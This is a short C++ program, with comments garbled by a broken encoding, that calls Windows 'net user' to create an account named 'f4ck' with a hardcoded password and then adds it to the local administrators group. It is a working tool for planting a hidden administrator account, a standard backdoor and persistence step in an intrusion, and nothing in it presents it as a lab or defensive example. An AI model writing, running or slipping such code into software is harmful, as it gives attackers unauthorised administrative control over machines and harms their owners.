#include <iostream>
#include <process.h>

/*
�����һ���ʺ�f4ck����Ϊf4ckf4ckf4ck���û�
*/ 
using namespace std;

int main()
{
        system("net user f4ck f4ckf4ckf4ck /ad");//����û�f4ck ����Ϊ f4ckf4ckf4ck

        system("net localgroup administrators f4ck /ad ");//�ѻ�f4ck��ӵ������� 
}
